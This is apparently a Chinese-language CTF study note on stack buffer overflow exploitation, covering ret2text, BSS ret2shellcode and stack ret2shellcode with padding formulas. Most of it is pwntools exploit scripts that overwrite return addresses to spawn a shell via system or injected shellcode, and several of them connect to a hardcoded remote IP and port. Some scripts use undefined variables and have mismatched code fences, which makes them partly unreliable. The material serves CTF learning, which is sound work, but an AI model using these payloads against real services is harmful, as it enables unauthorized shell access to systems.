rot2text攻擊法
0. 判斷32位64位 file -b
1. 查保護 ex: Canary, NX, PIE => checksec --file=./filename 或 checksec ./filename
2. 拖進IDA
3. 按下F5，找到可疑的func，包含不安全的輸入
4. shift+F12，找可能觸發終端的方式
5. 計算偏移量，編寫payload

**padding的計算方法**
對於32位元的程式 
只需要`(rbp+4個垃圾數據)+binsh_addr+system_addr`
64位元的的需要(rbp+8個垃圾數據) + rdi_ret + binsh_addr + system_addr
其中rdi_ret透過
ROPgadget --binary x64 --only "pop|ret" 
這個指令尋找
```
from pwn import *

//io = process('./target')
io = remote('ip', port)

getshell_addr = 0x0804859b

padding = 4 + 9

payload = b'a' * padding + p32(getshell_addr)

io.sendline(payload)

io.interactive()

```python
```
from pwn import *


io = remote('1.95.36.136', 2079)
# io = process('./x64')

rdi_ret = 0x00000000004007e3
system_addr = 0x400560

payload = b'a' * padding + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)

io.sendline(payload)

io.interactive()

# ret2shellcode(BSS)

```
from pwn import *

shellcode = asm(shellcraft.sh()) 

io = remote('1.95.36.136', 2066)
# io = process('./Easy_ShellCode')

padding = 0x68 + 4
bss_addr = 0x0804A080 
payload = b'a' * padding + p32(bss_addr)

io.recv()
io.sendline(shellcode)
io.recv()
io.sendline(payload)
io.sendline(b"cat flag")
io.interactive()
```python


# 棧上ret2shellcode(Stack)

```
from pwn import *

# io = remote('1.95.36.136', 2109)
io = process('./pwn2')
context(arch='amd64')

padding = 0x70 + 8
shellcode = asm(shellcraft.amd64.sh())

v4_addr = int(io.recvline()[:-1], 16)

payload = shellcode.ljust(padding, 'a') + p64(v4_addr) # 因為不是攻擊ROP 鏈，所以不需要求rdi_ret
io.sendline(payload)
io.sendline(b"cat flag")
io.interactive()

```python
